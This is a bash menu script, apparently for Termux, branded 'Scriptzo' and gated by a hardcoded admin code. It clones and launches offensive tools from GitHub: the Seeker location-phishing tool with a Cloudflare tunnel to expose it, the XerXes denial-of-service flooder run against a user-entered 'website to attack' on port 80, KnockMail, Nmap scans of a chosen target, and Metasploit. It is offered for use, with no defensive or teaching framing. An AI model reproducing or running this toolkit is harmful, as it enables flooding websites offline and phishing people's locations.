#!/bin/bash

# Set green text
GREEN='\033[0;32m'
NC='\033[0m' # No Color

clear
echo -e "${GREEN}"
echo "   _____           _       _           "
echo "  / ____|         (_)     | |          "
echo " | (___   ___ _ __ _ _ __ | |_ ___ _ __"
echo "  \___ \ / __| '__| | '_ \| __/ _ \ '__|"
echo "  ____) | (__| |  | | |_) | ||  __/ |   "
echo " |_____/ \___|_|  |_| .__/ \__\___|_|   "
echo "                   | |                 "
echo "                   |_|      SCRIPTZO   "
echo -e "${NC}"
sleep 1

# Prompt for admin code
echo -ne "${GREEN}Please enter the admin code: ${NC}"
read user_input
admin_code="SCR1PTED"

# Trim whitespace
user_input=$(echo "$user_input" | xargs)

if [ "$user_input" == "$admin_code" ]; then
    echo -e "${GREEN}Access granted. Welcome, admin!${NC}"
    sleep 1
    while true; do
        echo -e "${GREEN}"
        echo "======================================"
        echo "              SCRIPTZO MENU           "
        echo "======================================"
        echo "1. Seeker"
        echo "2. XerXes"
        echo "3. KnockMail"
        echo "4. Cloudflare"
        echo "5. Nmap"
        echo "6. Metasploit"
        echo "7. Exit"
        echo "======================================"
        echo -ne "Choose an option: ${NC}"
        read choice

        case $choice in
            1)
                echo "Launching Seeker..."
                if [ ! -d "seeker" ]; then
                    git clone https://github.com/thewhiteh4t/seeker
                fi
                cd seeker
                bash install.sh
                python3 seeker.py
                break
                ;;
            2)
                echo "Installing and launching XerXes..."
                if [ ! -d "XerXes" ]; then
                    git clone https://github.com/CyberXCodder/XerXes.git
                fi
                cd XerXes
                pkg install clang -y
                clang xerxes.c -o xerxes
                echo -ne "${GREEN}Enter the website to attack: ${NC}"
                read target
                echo "Attacking website: $target"
                ./xerxes "$target" 80
                break
                ;;
            3)
                echo "Launching KnockMail..."
                if [ ! -d "KnockMail" ]; then
                    apt update && apt upgrade -y
                    apt install python2 -y
                    apt install python -y
                    pip2 install requests
                    git clone https://github.com/4w4k3/KnockMail
                    cd KnockMail
                    chmod +x *
                    pip2 install -r requirements.txt
                else
                    cd KnockMail
                fi
                python2 knock.py
                break
                ;;
            4)
                echo "Starting Cloudflare tunnel..."
                cloudflared tunnel --url http://localhost:8080
                break
                ;;
            5)
                echo "Starting Nmap..."
                pkg install nmap -y
                echo -ne "${GREEN}Enter target IP/domain: ${NC}"
                read target
                nmap "$target"
                break
                ;;
            6)
                echo "Installing Metasploit..."
                pkg install unstable-repo -y
                pkg install metasploit -y
                msfconsole
                break
                ;;
            7)
                echo "Exiting..."; break ;;
            *)
                echo -e "${RED}Invalid option. Try again.${NC}"
                ;;
        esac
    done
else
    echo -e "${RED}Incorrect admin code. Access denied.${NC}"
fi